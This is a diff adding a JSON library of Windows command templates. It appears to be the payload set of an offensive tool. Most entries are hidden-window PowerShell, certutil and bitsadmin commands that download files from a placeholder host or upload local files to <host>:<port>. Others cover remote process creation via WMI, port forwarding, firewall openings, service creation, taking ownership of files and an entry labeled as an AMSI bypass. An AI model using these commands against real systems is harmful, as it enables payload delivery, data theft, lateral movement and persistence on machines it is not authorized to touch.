@@ -1,0 +1,68 @@
+{
+  "Windows_Utils": {
+    "Download - PowerShell Invoke-WebRequest": "powershell -NoP -W Hidden -C \"iwr http://<host>/<file> -OutFile <dest>\"",
+    "Download - PowerShell WebClient": "powershell -NoP -W Hidden -C \"(New-Object Net.WebClient).DownloadFile('http://<host>/<file>','<dest>')\"",
+    "Download - PowerShell BitsTransfer": "powershell -NoP -W Hidden -C \"Start-BitsTransfer -Source http://<host>/<file> -Destination <dest>\"",
+    "Download - curl.exe": "curl.exe -s -o <dest> http://<host>/<file>",
+    "Download - certutil": "certutil -urlcache -f http://<host>/<file> <dest>",
+    "Download - bitsadmin": "bitsadmin /transfer d /download /priority high http://<host>/<file> <dest>",
+    "Fetch Text - Invoke-RestMethod": "powershell -NoP -W Hidden -C \"irm http://<host>/<path>\"",
+
+    "Upload - PowerShell WebClient UploadFile": "powershell -NoP -W Hidden -C \"(New-Object Net.WebClient).UploadFile('http://<host>:<port>/upload','<file>')\"",
+    "Upload - PowerShell IWR POST": "powershell -NoP -W Hidden -C \"iwr -Uri http://<host>:<port>/ -Method POST -InFile <file> -ContentType 'application/octet-stream'\"",
+    "Upload - curl.exe Multipart": "curl.exe -s -F \"file=@<file>\" http://<host>:<port>/upload",
+    "Upload - curl.exe PUT": "curl.exe -s -T \"<file>\" http://<host>:<port>/<path>",
+
+    "SMB - Map Drive": "net use Z: \\\\<host>\\\\<share> <password> /user:<domain\\\\user>",
+    "SMB - Copy To Share": "copy <local_file> \\\\<host>\\\\<share>\\\\",
+    "SMB - List Share": "dir \\\\<host>\\\\<share>\\\\",
+
+    "Archive - Compress-Archive (ZIP)": "powershell -NoP -C \"Compress-Archive -Path <in_path> -DestinationPath <out_zip>\"",
+    "Archive - Expand-Archive (ZIP)": "powershell -NoP -C \"Expand-Archive -Path <zip> -DestinationPath <dest> -Force\"",
+    "Archive - tar Create": "tar -cf <out.tar> <path>",
+    "Archive - tar Extract": "tar -xf <in.tar> -C <dest>",
+
+    "Encode - certutil Base64 Encode": "certutil -encode <in_file> <out_file.b64>",
+    "Decode - certutil Base64 Decode": "certutil -decode <in_file.b64> <out_file>",
+    "Encode - PowerShell File → Base64": "powershell -NoP -C \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('<file>')) > <out.txt>\"",
+    "Decode - PowerShell Base64 → File": "powershell -NoP -C \"[IO.File]::WriteAllBytes('<out>',[Convert]::FromBase64String((Get-Content '<in.b64>')))\"",
+
+    "Hash - certutil MD5": "certutil -hashfile <file> MD5",
+    "Hash - certutil SHA1": "certutil -hashfile <file> SHA1",
+    "Hash - certutil SHA256": "certutil -hashfile <file> SHA256",
+    "Hash - PowerShell Get-FileHash": "powershell -NoP -C \"Get-FileHash <file> -Algorithm SHA256\"",
+
+    "ICACLS - Grant Full Control": "icacls <path> /grant <user>:F /T",
+    "TAKEOWN - Take Ownership": "takeown /F <path> /A /R /D Y",
+    "Unblock Downloaded File": "powershell -NoP -C \"Unblock-File -Path <file>\"",
+
+    "Enumerate - System Info": "systeminfo",
+    "Enumerate - IP Config": "ipconfig /all",
+    "Enumerate - Routes": "route print",
+    "Enumerate - ARP": "arp -a",
+    "Enumerate - Listening Ports": "netstat -ano",
+
+    "Test Port - PowerShell": "powershell -NoP -C \"Test-NetConnection <host> -Port <port>\"",
+    "Port Forward - netsh portproxy": "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<lport> connectaddress=<rhost> connectport=<rport>",
+    "Firewall - Allow TCP Port": "netsh advfirewall firewall add rule name=\"<name>\" dir=in action=allow protocol=TCP localport=<port>",
+
+    "WMI - Remote Process Create": "wmic /node:<host> process call create \"<cmd>\"",
+    "WinRM - Copy-Item To Session": "powershell -NoP -C \"$s=New-PSSession -ComputerName <host>; Copy-Item <file> -ToSession $s -Destination <dest>; Remove-PSSession $s\"",
+
+    "PowerShell - AMSI Bypass (Unblock-File only)": "powershell -NoP -C \"Unblock-File -Path <script.ps1> && .\\<script.ps1>\"",
+    "Scheduled Task - Create Once": "schtasks /create /sc once /st <HH:MM> /tn <name> /tr \"<cmd>\"",
+    "Service - Query": "sc query <service>",
+    "Service - Create": "sc create <name> binPath= \"<path_to_exe>\" start= demand",
+    "Service - Start": "sc start <name>",
+    "Service - Delete": "sc delete <name>",
+
+    "Wevtutil - Export Log": "wevtutil epl <LogName> <out.evtx>",
+    "Wevtutil - Query Last 50": "wevtutil qe <LogName> /c:50 /rd:true /f:text",
+
+    "DNS - Query": "nslookup <name> <server>",
+    "DNS - Flush Cache": "ipconfig /flushdns",
+
+    "Time - Sync NTP": "w32tm /resync",
+    "Time - Set NTP Server": "w32tm /config /syncfromflags:manual /manualpeerlist:\"<ntp_server>\" /update"
+  }
+}
